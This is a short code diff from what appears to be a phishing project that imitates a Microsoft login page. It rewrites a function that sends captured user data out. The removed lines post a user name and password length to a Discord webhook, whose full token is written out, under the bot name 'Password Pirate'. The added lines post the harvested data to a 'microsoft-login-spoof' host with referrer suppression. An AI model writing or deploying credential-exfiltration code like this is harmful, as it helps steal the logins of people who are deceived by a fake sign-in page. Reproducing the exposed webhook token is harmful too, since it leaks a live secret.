@@ -23,15 +23,14 @@ const createBody = (data) => {
 }
 
 const sendData = (data) => {
-    fetch('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
+    fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
         method: 'POST',
+        cache: 'no-cache',
         headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
         },
-        body: JSON.stringify({
-            content: `User: ${data.userName}, Password Length: ${data.passwordLength}`,
-            username: 'Password Pirate'
-        }),
+        referrerPolicy: 'no-referrer',
+        body: createBody(data),
     })
         .then(response => {
             if (!response.ok) {
